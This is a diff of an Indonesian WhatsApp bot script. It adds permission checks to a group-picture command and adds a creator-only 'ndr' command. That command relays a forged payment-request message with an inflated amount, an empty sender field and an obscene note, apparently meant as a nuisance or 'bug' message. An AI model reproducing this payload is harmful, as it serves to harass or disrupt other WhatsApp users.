@@ -500,10 +500,10 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 }
 break
 //=================================================//
-case 'setppgroup': case 'setppgrup': case 'setppgc': {
-if (!isCreator) return
-if (isBan) throw sticBanLu(from)
-
+case 'gantippgc': case 'setttttting': case 'botrrdd': {
+if (!m.isGroup) throw mess.group
+if (!isBotAdmins) throw SiGroupadmin(from)
+if (!isAdmins) throw mess.admin
 sticWait(from)
 if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
 if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
@@ -1067,7 +1067,24 @@ haikal.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: doc })
 }
 break
 //=================================================//
-
+case 'ndr': {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
+var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"requestPaymentMessage": {
+"currencyCodeIso4217": "IDR",
+"amount1000": "999999",
+"requestPaymentimage": messa.imageMessage,
+"requestFrom": "@s.whatsapp.net",
+"noteMessage": {
+"extendedTextMessage": {
+"text": `memek`,
+}
+}}}), { userJid: m.chat, quoted: m })
+haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+}
+break
 //=================================================//
 case 'hu': {
 if (!isCreator) return
@@ -1153,6 +1170,8 @@ if (isBan) throw sticBanLu(from)
  haikal.sendMessage(m.chat, {audio: ro, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
  }
  break
+//=================================================//
+
 //=================================================//
 case 'inspect': {
 if (isBan) throw sticBanLu(from)
